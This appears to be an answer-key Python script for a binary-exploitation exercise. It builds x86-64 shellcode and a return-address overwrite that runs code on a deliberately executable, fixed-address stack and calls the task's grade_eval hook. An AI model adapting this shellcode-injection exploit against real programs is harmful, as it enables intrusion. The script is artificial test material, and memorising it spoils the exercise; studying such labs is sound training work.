#!/usr/bin/env python3
"""Task: stack execution on attack/dark-calc.

init_fixed_stack() maps an RWX region at 0x721000000000 and __wrap_main()
sets rsp to 0x721000801000 before calling main().  Consequently input()'s
frame is at a fixed, executable address:

    buffer (rbp-0x10) = 0x721000800fd0
    saved rbp         = 0x721000800fe0
    saved return addr = 0x721000800fe8

The 23-byte shellcode calls grade_eval(4), then exits with syscall 60.
The saved return address points back to the start of the shellcode.
"""

import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


BUFFER = 0x721000800FD0
GRADE_EVAL = 0x401A87

shellcode = bytearray()
shellcode += b"\x6a\x04"                     # push 4
shellcode += b"\x5f"                         # pop rdi
shellcode += b"\x48\xb8" + p64(GRADE_EVAL)   # mov rax, grade_eval
shellcode += b"\xff\xd0"                     # call rax
shellcode += b"\x31\xc0"                     # xor eax, eax
shellcode += b"\xb0\x3c"                     # mov al, 60
shellcode += b"\x31\xff"                     # xor edi, edi
shellcode += b"\x0f\x05"                     # syscall

# Bytes 0..23 are executable: the 16-byte buffer plus the saved-rbp slot.
shellcode = bytes(shellcode).ljust(24, b"\x90")
payload = shellcode + p64(BUFFER)

assert len(payload) == 32
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
